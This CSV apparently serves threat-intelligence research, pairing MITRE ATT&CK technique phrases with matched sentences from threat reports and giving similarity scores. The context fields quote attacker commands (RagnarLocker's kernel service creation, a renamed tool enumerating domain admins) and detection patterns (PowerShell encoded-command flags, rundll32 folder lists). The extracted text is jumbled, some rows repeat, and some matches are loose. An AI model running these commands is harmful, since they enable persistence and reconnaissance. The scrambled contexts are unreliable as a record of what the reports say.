phrase,before,matching_sentence,after,report_id,rank,cosine_score
"on windows and linux, these system processes are referred to as services.","see more > t1543: create or modify system process “adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. when operating systems boot up, they can start processes that perform background system functions.","on windows and linux, these system processes are referred to as services.","on macos, launchd processes known as launch daemon and launch agent are run to finish system initialization and load user specific parameters.” 33 seuqinhcet-bus tnelaverp l 33 t1543: create or modify system process2021 threat detection report technique t1543.003 windows service #3 windows service made it into our top 10 thanks to a single threat: blue parent technique rank mockingbird, an activity cluster we identified that deploys monero cryptocurrency-mining payloads and leverages windows services for persistence. 4.9% analysis organizations affected why do adversaries use windows service?",66f561f73063d2948570024f,3269,1.0
adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code.,"when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.7303010063180363
"hafnium has exploited cve-2021-26855, cve-2021-26857, cve-2021-26858, and cve-2021-27065  to compromise on-premises versions of microsoft exchange server, enabling access to email accounts and installation of additional malware.","the vulnerabilities typically run from the us-based private servers exploited were cve-2021-26855, cve-2021-26857, to exfiltrate data from an organization’s network. cve-2021-26858 a post-authentication arbitrary file write vulnerability in exchange.","cve-2021-26858, and cve-2021-27065.","microsoft assesses hafnium was associated with the initial activity with the 0-day exploits; however, cve-2021-27065 a post-authentication arbitrary file write vulnerability in exchange. the attacks included three steps.",66f561b03063d2948570024e,1886,0.7610550568854744
adversaries may use hidden users to mask the presence of user accounts they create or modify.,"this is a post-exploitation tool designed for network pivoting from a compromised unix box. it collects usernames, ssh keys, and known hosts from a unix system, and then it tries to connect via ssh to all the combinations found.",hidden users adversaries may use hidden users to mask the presence of user accounts that they create.,we’ve seen various examples of creating and hiding users in the victim’s environment. 2021 cloud native threat report 24team command and control proxy reverse proxy tools can create a secure tunnel to servers located behind firewalls or local machines that do not have a public ip.,66f562193063d29485700252,4444,0.8810448734760715
"-list /groups on macos, and groups on linux can list local groups.","that they have access to. in addition, the volume of network traffic plus the usual noise of constant web shells deep dive internet attacks means that targeted traffic aimed web shells remain popular with advanced at a web server can blend right in, making detection persistent threat (apt) actors of all types, including of web shells a lot more difficult and requiring nobelium17 and hafnium18 nation state activity advanced behavior-based detections.",groups.,"as dart and the microsoft 365 defender research team reported in both 202019 and 2021,20 in february 2020, we reported a steady increase web shell usage continues to climb among nation in the use of web shells in attacks worldwide. the state groups and criminal organizations.",66f561b03063d2948570024e,1504,0.757916433739184
adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.,"l 72 t1569.002: service execution2021 threat detection report technique t1036 masquerading #10 masquerading ranks tenth this year thanks in large part to detections associated overall rank with its rename system utilities sub-technique. 31.2% t1036.003 rename system utilities organizations affected 23.1% 624 organizations affected confirmed threats a behavior that’s inherently suspicious in the context of one 906 process can be completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off.",confirmed threats see more > t1036: masquerading “adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.,"masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. this may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.” 73 seuqinhcet-bus tnelaverp l 73 t1036: masquerading2021 threat detection report technique t1036.003 rename system utilities #10 a behavior that’s inherently suspicious in the context of one process can be parent technique rank completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off.",66f561f73063d2948570024f,3702,0.8178279612213413
"masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.","31.2% t1036.003 rename system utilities organizations affected 23.1% 624 organizations affected confirmed threats a behavior that’s inherently suspicious in the context of one 906 process can be completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off. confirmed threats see more > t1036: masquerading “adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools.","masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.","this may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.” 73 seuqinhcet-bus tnelaverp l 73 t1036: masquerading2021 threat detection report technique t1036.003 rename system utilities #10 a behavior that’s inherently suspicious in the context of one process can be parent technique rank completely normal in the context of another, which is precisely why adversaries rename system utilities to throw defenders off. 23.1% analysis organizations affected why do adversaries use rename system utilities?",66f561f73063d2948570024f,3703,1.0000000000000002
"adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.","l 46 t1053.005: scheduled task2021 threat detection report technique t1003 os credential dumping #5 os credential dumping ranks fifth this year thanks almost entirely to detections overall rank associated with its lsass memory sub-technique. 19.1% t1003.001 lsass memory organizations affected 15.5% 1,447 organizations affected confirmed threats the local security authority subsystem service (lsass) is a boon 1,554 for adversaries looking to steal sensitive, often encrypted data, with a little help from administrative tools such as procdump and mimikatz.","confirmed threats see more > t1003: os credential dumping “adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.","credentials can then be used to perform lateral movement and access restricted information.” 47 seuqinhcet-bus tnelaverp l 47 t1003: os credential dumping2021 threat detection report technique t1003.001 lsass memory #5 the local security authority subsystem service (lsass) is a boon for parent technique rank adversaries looking to steal sensitive credentials, with a little help from administrative tools such as procdump. 15.5% analysis organizations affected why do adversaries use lsass memory?",66f561f73063d2948570024f,3400,0.8464144369798433
"rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them.","we continue to see this use of compromised websites to store malicious files such as scripts. obtain capabilities as written on mitre’s site, adversaries might buy or steal capabilities that can be used during targeting before compromising a victim.","rather than develop their capabilities in-house, adversaries can purchase, freely download, or steal them.","we have seen attackers using open-source tools, and specifically offensive security tools, to achieve their goals. initial access exploit public-facing application these attacks mostly exploit a blog misconfigured docker api port exposed threat alert: attackers building to the internet and allow all incoming malicious images directly on your host › traffic access.",66f562193063d29485700252,4373,0.8466270041890476
"adversaries can use powershell to perform a number of actions, including discovery of information and execution of code.","aliases, abbreviated cmdlets, argument names, and calling .net methods— powershell is a powerful interactive offers attackers many ways to invoke base64 and other encoding. below is a command-line interface and scripting case-agnostic review of the methods we commonly observe in rank order, with environment included in the windows approximate percentages representing their frequency of occurrence in our operating system.","adversaries can detections: use powershell to perform a number of actions, including discovery of • 27%: -e information and execution of code.","• 25%: -ec examples include the start-process • 21%: -encodecommand cmdlet which can be used to run an • 15%: [system.convert]::frombase64string() executable and the invoke-command • 6%: -encoded cmdlet which runs a command locally • 4%: -enc or on a remote computer (though • 1%: -en administrator permissions are required • .4%: -encod to use powershell to connect to • .01%: -enco remote systems).” • < .01%: -encodedco, -encodedc, -en^c given powershell’s support for shortened command-line arguments, escape characters in the command line, and more, do not consider the above list comprehensive. emerging windows command shell tradecraft while leveraging powershell, adversaries have been known to use format string obfuscation (i.e., the dynamic building of strings by using non-standard sequences of format string operators like {0} and {1}) instead of base64 encoding.",66f561f73063d2948570024f,3072,0.8798874932821235
security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.,"interestingly, this example shows “double masquerading”— system utilities to try to evade security both renaming the utility as well as choosing a name that mimics a different mechanisms concerning the usage of legitimate process. those utilities.",security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.,it may be possible to bypass c:\\\\windows\\\\system32\\\\cmd.exe /c csrss.exe -h those security mechanisms by renaming breached.contoso[. ]com -f (name=”domain admins”) the utility prior to utilization (ex: member -list | csrss.exe -h breached.contoso[.],66f561f73063d2948570024f,3720,1.0
"using rundll32.exe, vice executing directly  shared modules, may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations.","sometimes the execution of rundll32 by itself won’t be enough to determine malicious intent, and that’s when you can rely on process lineage to gain additional context. t1218.011: rundll32 detection suggestions “adversaries may abuse rundll32.exe some successful analytics for detecting malicious use of rundll32 include to proxy execution of malicious code.","the following: using rundll32.exe, vice executing directly (i.e., shared modules), may avoid triggering security tools that may execution from world-writable folders not monitor execution of the rundll32.","exe process because of allowlists or since adversaries will try to use rundll32 to load or write dlls from world or false positives from normal operations. user-writable folders, it makes sense to watch for rundll32.exe writing or loading rundll32.exe is commonly associated files to or from any of the following locations: with executing dll payloads.” • %appdata% • %public% • %programdata% • %temp% • %windir%\\\\system32\\\\microsoft\\\\crypto\\\\rsa\\\\machinekeys • %windir%\\\\system32\\\\tasks_migrated\\\\microsoft\\\\windows\\\\pla\\\\system • %windir%\\\\syswow64\\\\tasks\\\\microsoft\\\\windows\\\\pla\\\\system • %windir%\\\\debug\\\\wia • %windir%\\\\system32\\\\tasks • %windir%\\\\syswow64\\\\tasks • %windir%\\\\tasks • %windir%\\\\registration\\\\crmlog • %windir%\\\\system32\\\\com\\\\dmp • %windir%\\\\system32\\\\fxstmp • %windir%\\\\system32\\\\spool\\\\drivers\\\\color • %windir%\\\\system32\\\\spool\\\\printers • %windir%\\\\system32\\\\spool\\\\servers • %windir%\\\\syswow64\\\\com\\\\dmp • %windir%\\\\syswow64\\\\fxstmp • %windir%\\\\temp • %windir%\\\\tracing export functionalities you should also consider monitoring for instances of rundll32.exe running windows native dlls that have export functionalities that adversaries commonly l 24 t1218.001: rundll322021 threat detection report leverage for executing malicious code and evading defensive controls.",66f561f73063d2948570024f,3180,0.7181564970801156
adversaries may abuse the windows task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.9288052342487969
there are multiple ways to access the task scheduler in windows.,this is the second most common configuration we observed. task scheduler to perform task scheduling for initial or recurring execution of malicious code.,there are multiple ways to access the detection task scheduler in windows.,"the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel. in some cases, adversaries have used for windows systems, the microsoft-windows-task-scheduler/operational log a .net wrapper for the windows is a good source for monitoring the creation, modification, deletion, and use task scheduler, and alternatively, of scheduled tasks.",66f561f73063d2948570024f,3355,0.9603335907516127
"the schtasks can be run directly on the command line, or the task scheduler can be opened through the gui within the administrator tools section of the control panel.",task scheduler to perform task scheduling for initial or recurring execution of malicious code. there are multiple ways to access the detection task scheduler in windows.,"the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.","in some cases, adversaries have used for windows systems, the microsoft-windows-task-scheduler/operational log a .net wrapper for the windows is a good source for monitoring the creation, modification, deletion, and use task scheduler, and alternatively, of scheduled tasks. event ids 106 and 140 record when a new scheduled task is adversaries have used the windows created or updated, respectively, along with the name of the task.",66f561f73063d2948570024f,3356,0.8749788621091924
adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.,"l 38 t1543.003: windows service2021 threat detection report technique t1053 scheduled task/job #4 scheduled task/job ranks fourth this year thanks in large part to detections overall rank associated with its scheduled task sub-technique. 32.8% t1053.005 scheduled task organizations affected 27.6% 2,740 organizations affected confirmed threats 3,258 the primary task-scheduling component of windows, this technique allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party confirmed threats software.",see more > t1053: scheduled task/job “adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.,"utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. a task can also be scheduled on a remote system, provided the proper authentication is met (ex: rpc and file and printer sharing in windows environments).",66f561f73063d2948570024f,3321,0.818229363451153
utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.,"32.8% t1053.005 scheduled task organizations affected 27.6% 2,740 organizations affected confirmed threats 3,258 the primary task-scheduling component of windows, this technique allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party confirmed threats software. see more > t1053: scheduled task/job “adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code.",utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.,"a task can also be scheduled on a remote system, provided the proper authentication is met (ex: rpc and file and printer sharing in windows environments). scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.” 39 seuqinhcet-bus tnelaverp l 39 t1053: scheduled task/job2021 threat detection report technique t1053.005 scheduled task #4 leveraging the primary task-scheduling component of windows, this technique parent technique rank allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party software.",66f561f73063d2948570024f,3322,1.0000000000000002
"a task can also be scheduled on a remote system, provided the proper authentication is met .",see more > t1053: scheduled task/job “adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time.,"a task can also be scheduled on a remote system, provided the proper authentication is met (ex: rpc and file and printer sharing in windows environments).","scheduling a task on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.” 39 seuqinhcet-bus tnelaverp l 39 t1053: scheduled task/job2021 threat detection report technique t1053.005 scheduled task #4 leveraging the primary task-scheduling component of windows, this technique parent technique rank allows adversarial persistence and execution behaviors to blend in with routine activity emanating from native tools and third-party software. 27.6% analysis organizations affected why do adversaries use scheduled task?",66f561f73063d2948570024f,3323,0.7196412773452097
adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.,"49.3% t1218.011 organizations affected rundll32 30% 2,380 3,755 organizations affected confirmed threats adversaries use this native windows process to execute malicious code through dynamic link libraries (dll), often to bypass confirmed threats application controls. see more > t1218.005 mshta 18.8% 738 organizations affected confirmed threats mshta is attractive to adversaries both in the early and latter stages of an infection because it enables them to proxy the execution of arbitrary code through a trusted utility.",see more > t1218: signed binary process execution “adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.,"binaries signed with trusted digital certificates can execute on windows systems protected by digital signature validation. several microsoft signed binaries that are default on windows installations can be used to proxy execution of other files.” 20 seuqinhcet-bus tnelaverp l 20 t1218: signed binary proxy execution2021 threat detection report technique t1218.011 rundll32 #2 adversaries use this native windows process to execute malicious code through parent technique rank dynamic link libraries (dll), often to bypass application controls.",66f561f73063d2948570024f,3151,0.8612999776299799
binaries signed with trusted digital certificates can execute on windows systems protected by digital signature validation.,see more > t1218.005 mshta 18.8% 738 organizations affected confirmed threats mshta is attractive to adversaries both in the early and latter stages of an infection because it enables them to proxy the execution of arbitrary code through a trusted utility. see more > t1218: signed binary process execution “adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries.,binaries signed with trusted digital certificates can execute on windows systems protected by digital signature validation.,"several microsoft signed binaries that are default on windows installations can be used to proxy execution of other files.” 20 seuqinhcet-bus tnelaverp l 20 t1218: signed binary proxy execution2021 threat detection report technique t1218.011 rundll32 #2 adversaries use this native windows process to execute malicious code through parent technique rank dynamic link libraries (dll), often to bypass application controls. analysis 30% why do adversaries use rundll32?",66f561f73063d2948570024f,3152,1.0000000000000002
adversaries may abuse system services or daemons to execute commands or programs.,"l 68 t1105: ingress tool transfer2021 threat detection report technique t1569 system services #9 system services ranks ninth this year thanks almost entirely to detections overall rank associated with its service execution sub-technique. 20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels.",see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.,"adversaries can execute malicious content by interacting with or creating services. many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels.",66f561f73063d2948570024f,3652,0.7632333276629437
adversaries can execute malicious content by interacting with or creating services either locally or remotely.,"20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels. see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.",adversaries can execute malicious content by interacting with or creating services.,"many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels. 19.2% analysis organizations affected why do adversaries use service execution?",66f561f73063d2948570024f,3653,0.7876163310853204
adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code.,"when a scheduled task is created without specifying a user context, it will run in the context of the user who created the “adversaries may abuse the windows task. this is the second most common configuration we observed.",task scheduler to perform task scheduling for initial or recurring execution of malicious code.,"there are multiple ways to access the detection task scheduler in windows. the <code>schtasks</code> can be run collection requirements directly on the command line, or the task scheduler can be opened through windows event logs the gui within the administrator tools section of the control panel.",66f561f73063d2948570024f,3354,0.7103600077234297
"the login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.","(e.g., ticket, network sniffing) known vulnerability exploitation, drive- by download, phishing attack vector, • how did c2 servers access the compromised credential access) environment? (e.g., unknown or unexpected traffic or http, https, ftp, • how was “persistence” achieved?",etc.,"; data encoding or obfuscation; (e.g., new accounts, hooking, startup domain fronting; uncommon ports) item, registry run keys, batch jobs, scheduled tasks) edr and ndr technologies using an edr solution during a ndr deployments give investigators cyber-espionage investigation can access to large amounts of data, which significantly increase the effectiveness they can index for rapid searches to of the investigation. this technology identify anomalies.",66f561943063d2948570024c,854,0.7559371088606488
adversaries may create or modify windows services to repeatedly execute malicious payloads as part of persistence.,"l 32 t1218.005: mshta2021 threat detection report technique t1543 create or modify #3 system process overall rank create or modify system process ranks third this year thanks in large part to detections associated with its windows service sub-technique. 32.8% organizations affected t1059.001 windows service 4.9% 3,324 3,197 organizations affected confirmed threats typically, windows services automatically run with elevated confirmed threats privileges during the boot cycle of the operating system, granting adversaries a means of both persistence and privilege escalation.",see more > t1543: create or modify system process “adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence.,"when operating systems boot up, they can start processes that perform background system functions. on windows and linux, these system processes are referred to as services.",66f561f73063d2948570024f,3267,0.7203847198104856
"when windows boots up, it starts programs or applications called services that perform background system functions.","ragnarlocker deployed custom virtual machines to prevent direct analysis of the encryption malware on the endpoint. as part of its setup script, ragnarlocker leverages sc.exe to create the service vboxdrv using these commands: t1543.003: windows service “adversaries may create or modify sc create vboxdrv binpath= “%binpath%\\\\drivers\\\\ windows services to repeatedly vboxdrv.sys” type= kernel start= auto error= execute malicious payloads as part of persistence.","when windows boots up, it normal displayname= portablevboxdrv’ starts programs or applications called services that perform background system functions.","windows service detection configuration information, including the file path to the service’s executable collection requirements or recovery programs/commands, is stored in the windows registry. service configurations can be modified using command-line monitoring utilities such as sc.exe and reg.” the use of sc.exe to manually create, register, or modify a service is a good indication of malicious use of windows services.",66f561f73063d2948570024f,3295,0.8113859515928408
"windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the windows registry.","as part of its setup script, ragnarlocker leverages sc.exe to create the service vboxdrv using these commands: t1543.003: windows service “adversaries may create or modify sc create vboxdrv binpath= “%binpath%\\\\drivers\\\\ windows services to repeatedly vboxdrv.sys” type= kernel start= auto error= execute malicious payloads as part of persistence. when windows boots up, it normal displayname= portablevboxdrv’ starts programs or applications called services that perform background system functions.","windows service detection configuration information, including the file path to the service’s executable collection requirements or recovery programs/commands, is stored in the windows registry.","service configurations can be modified using command-line monitoring utilities such as sc.exe and reg.” the use of sc.exe to manually create, register, or modify a service is a good indication of malicious use of windows services. while there are many methods of creating and modifying services, adversaries still regularly leverage sc.exe to perform service operations.",66f561f73063d2948570024f,3296,0.9074472071703472
"adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.","it remains among the most versatile of built-in utilities for adversaries, defenders, and system administrators alike. see more > t1059.003 windows command shell 38.4% 1,984 organizations affected confirmed threats while it doesn’t do much on its own, windows command shell can call on virtually any executable on the system to execute batch files and arbitrary tasks.","see more > t1059: command and scripting “adversaries may abuse command and script interpreters to execute commands, scripts, or binaries.","these interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. most systems come with some built-in command-line interface and scripting capabilities, for example, macos and linux distributions include some flavor of unix shell while windows installations include the windows command shell and powershell.” 11 seuqinhcet-bus tnelaverp l 11 t1059: command and scripting interpreter2021 threat detection report technique t1059.001 powershell #1 powershell was the most common technique we observed in 2020, affecting parent technique rank nearly half of our customers.",66f561f73063d2948570024f,3057,0.8001322745669907
adversaries may abuse system services or daemons to execute commands or programs.,"l 68 t1105: ingress tool transfer2021 threat detection report technique t1569 system services #9 system services ranks ninth this year thanks almost entirely to detections overall rank associated with its service execution sub-technique. 20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels.",see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.,"adversaries can execute malicious content by interacting with or creating services. many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels.",66f561f73063d2948570024f,3652,0.7632333276629437
adversaries can execute malicious content by interacting with or creating services either locally or remotely.,"20.3% t1569.002 service execution organizations affected 19.2% 892 organizations affected confirmed threats adversaries use the windows service manager to run commands or 909 install or manipulate services, often with elevated privilege levels. see more > confirmed threats t1569: system services “adversaries may abuse system services or daemons to execute commands or programs.",adversaries can execute malicious content by interacting with or creating services.,"many services are set to run at boot, which can aid in achieving persistence (create or modify system process), but adversaries can also abuse services for one- time or temporary execution.” 69 seuqinhcet-bus tnelaverp l 69 t1569: system services2021 threat detection report technique t1569.002 service execution #9 adversaries use the windows service manager to run commands or install or parent technique rank manipulate services, often with elevated privilege levels. 19.2% analysis organizations affected why do adversaries use service execution?",66f561f73063d2948570024f,3653,0.7876163310853204
"when windows boots up, it starts programs or applications called services that perform background system functions.","ragnarlocker deployed custom virtual machines to prevent direct analysis of the encryption malware on the endpoint. as part of its setup script, ragnarlocker leverages sc.exe to create the service vboxdrv using these commands: t1543.003: windows service “adversaries may create or modify sc create vboxdrv binpath= “%binpath%\\\\drivers\\\\ windows services to repeatedly vboxdrv.sys” type= kernel start= auto error= execute malicious payloads as part of persistence.","when windows boots up, it normal displayname= portablevboxdrv’ starts programs or applications called services that perform background system functions.","windows service detection configuration information, including the file path to the service’s executable collection requirements or recovery programs/commands, is stored in the windows registry. service configurations can be modified using command-line monitoring utilities such as sc.exe and reg.” the use of sc.exe to manually create, register, or modify a service is a good indication of malicious use of windows services.",66f561f73063d2948570024f,3295,0.8113859515928408
adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise.,"section 4: attack techniques trends new threats form the supply-chain supply chain attacks are motivated by espionage end sabotage of specific targets and can impact any hardware or software component in production supply chain attacks (t1195.001) are considered the most sophisticated form of threats, posing a significant risk for modern organizations. historically such threats are perpetrated by apt exploiting and infiltrating the production pipeline in order to implant malware or for disruption.",as stated by mitre “adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise”.,"supply chain attacks can impact any hardware or software component in production, while the main motivations behinds are espionage end sabotage of specific targets, threat actors may move on to additional tactics and target a broad set of consumers. the 2020 is also the year of the solarwinds supply chain attack.",66f5625a3063d29485700257,460,0.7302772855509047
adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise.,"section 4: attack techniques trends new threats form the supply-chain supply chain attacks are motivated by espionage end sabotage of specific targets and can impact any hardware or software component in production supply chain attacks (t1195.001) are considered the most sophisticated form of threats, posing a significant risk for modern organizations. historically such threats are perpetrated by apt exploiting and infiltrating the production pipeline in order to implant malware or for disruption.",as stated by mitre “adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise”.,"supply chain attacks can impact any hardware or software component in production, while the main motivations behinds are espionage end sabotage of specific targets, threat actors may move on to additional tactics and target a broad set of consumers. the 2020 is also the year of the solarwinds supply chain attack.",66f5625a3063d29485700257,460,0.7259723830636754
"the group has previously exploited cve-2017-8570, cve-2012-1856, cve-2014-4114, cve-2017-0199, cve-2017-11882, and cve-2015-1641.","with timing reminiscent of the 4. cve-2021-1675 4. cve-2020-0796 4. cve-2018-4878 solarwinds orion sunburst backdoor disclosure in december 2020, the most serious vulnerability of 2021, 5. cve-2021-27065 5. cve-2017-11882 5. cve-2019-0752 commonly known as “log4shell” and tracked as cve- 6. cve-2021-36934 6. cve-2020-0674 6. cve-2017-0199 2021-44228, was first publicly disclosed on december 7. cve-2021-40444 7. cve-2019-1367 7. cve-2015-2419 9, 2021. other major vulnerabilities throughout the 8. cve-2021-26855 8. cve-2012-0158 8. cve-2018-20250 year were identified affecting microsoft exchange and windows print spoolers, vmware vcenter, legacy 9. cve-2021-22205 9. cve-2020-14882 9. cve-2017-8750 accellion fta, and the it management company kaseya’s 10. cve-2021-21551 10. cve-2019-1458 10. cve-2012-0158 virtual system administrator. each of these critical 2018 2017 2016 vulnerabilities were exploited by criminal and state- 1. cve-2018-8174 1. cve-2017-0199 1. cve-2016-0189 sponsored threat actors in compromises including data 2. cve-2018-4878 2. cve-2016-0189 2. cve-2016-1019 breaches and ransomware attacks that had far-reaching consequences for vendors in all industry tiers.","3. cve-2017-11882 3. cve-2017-0022 3. cve-2016-4117 4. cve-2017-8750 4. cve-2016-7200 4. cve-2015-8651 the severity of many of the disclosed and exploited vulnerabilities in 2021, particularly the log4shell 5. cve-2017-0199 5. cve-2016-7201 5. cve-2016-0034 vulnerabilities and the numerous vulnerabilities 6. cve-2016-0189 6. cve-2015-8651 6. cve-2016-1010 associated with microsoft technologies, should not 7. cve-2017-8570 7. cve-2014-6332 7. cve-2014-4113 distract from the number and diversity of affected 8. cve-2018-8373 8. cve-2016-4117 8. cve-2015-8446 products throughout 2021. high-risk vulnerabilities 9. cve-2012-0158 9. cve-2016-1019 9. cve-2016-3298 and actively exploited vulnerabilities disclosed in 2021 affected products belonging to a more diverse array of 10. cve-2015-1805 10. cve-2017-0037 10. cve-2015-7645 parent companies than prior years.","outside of the top table 1: top exploited vulnerabilities between 2016 and 2021, with repeats designated by color. (source: recorded future) 10, which mainly affected microsoft products, serious actively exploited vulnerabilities were also identified affecting products from linux, google, pulse connect secure, and apple, among others.",66f5631b3063d29485700262,3664,0.7091967687233195
unc2452 set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,• memory-only dropper and malleable beacons. • ip addresses located in different countries.,• attacker hostnames match victim environment.,"• use a dga algorithm and intermediary c2. moreover, the backdoor behavior is masqueraded inside the legit solarwinds activity as the orion improvement program (oip).",66f5625a3063d29485700257,473,0.7081089695510672
apt29 has set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,• memory-only dropper and malleable beacons. • ip addresses located in different countries.,• attacker hostnames match victim environment.,"• use a dga algorithm and intermediary c2. moreover, the backdoor behavior is masqueraded inside the legit solarwinds activity as the orion improvement program (oip).",66f5625a3063d29485700257,473,0.7032997490917291
